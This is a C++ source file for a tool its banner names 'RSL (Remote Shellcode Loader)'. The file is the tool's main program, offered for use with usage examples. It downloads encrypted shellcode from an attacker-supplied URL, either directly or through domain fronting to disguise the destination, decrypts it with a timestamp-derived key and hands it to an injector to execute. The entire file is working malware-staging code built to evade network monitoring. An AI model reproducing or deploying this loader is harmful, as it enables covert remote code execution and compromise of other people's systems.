#include "HttpConnect.h"
#include "SimpleShellcodeInjector.h"
#include "cryptopp.h"
#include <time.h>
void logo()
{
	unsigned static char logo[] =
		" +-+-+-+ +-+-+-+-+-+-+-+ +-+-+-+-+-+-+-+-+-+ +-+-+-+-+-+--+\n"
		" |R|S|L| |(|R|e|m|o|t|e| |S|h|e|l|l|c|o|d|e| |L|o|a|d|e|r)|\n"
		" +-+-+-+-+-+-+-+-+-+-+-+ +-+-+-+-+-+-+-+-+-+ +-+-+-+-+-+--+\n"
		" |b|y| |U|k|n|o|w| | | |                                        \n"
		" +-+-+ +-+-+-+-+-+-+-+-+\n";
	printf("%s\n\n", &logo);
}

string random()
{
	time_t t;
	time(&t);
	stringstream sstr;
	sstr << t;
	string str = sstr.str();
	//printf(str.c_str());
	return str.c_str();
}


void usage()
{
	printf("[+] usage: RSL URL Default\r\n\t\tGetShellcodeByDefault\n");
	printf("[+] usage: RSL URL DomainFronting\r\n\t\tGetShellcodeByDomainFronting\n");
	printf("[+] eg: RSL http://baidu.com/api Default\n");
	printf("[+] eg: RSL http://baidu.com/api DomainFronting\n");
}


string decrypt(string key,string shellcode) {
	key = key + "123456";
	cryptopp::init(key, "0000000000000000");
	string en = cryptopp::decrypt(shellcode);
	return en;
}



int main(int argc, char* argv[])
{

	if (argc != 3 )
	{
		logo();
		usage();
		return -1;
	}
	else if(strcmp(argv[2], "Default") == 0)
	{
		size_t len;
		char buf[2048];
		string url = argv[1];
		string t = random();
		string urlpath = url + "?t=" + t;
		string a = decrypt(t,GetShellcodeByDefault(urlpath));
	//	string a = GetShellcodeByDefault(urlpath);
		strcpy(buf, a.c_str());
	//	printf(a.c_str());
		len = a.length();
	//	printf("Length: %d\n", len);
		logo();
		if (len != 0)
		{
			Go(buf);
		}
		else
		{
			printf("Get shellcode fail !");
		}
	}
	else if(strcmp(argv[2], "DomainFronting") == 0) {
		size_t len;
		char buf[2048];
		string url = argv[1];
		string t = random();
		string urlpath = url + "?t=" + t;
		string a = decrypt(t, GetShellcodeByDomainFronting(urlpath));
	//	string a = GetShellcodeByDomainFronting(urlpath);
		strcpy(buf, a.c_str());
	//	printf(a.c_str());
		len = a.length();
		//	printf("Length: %d\n", len);
		logo();
		if (len != 0)
		{
			Go(buf);
		}
		else
		{
			printf("Get shellcode fail !");
		}
	}
	else {
		logo();
		usage();
		return -1;
	}
	return 0;
}

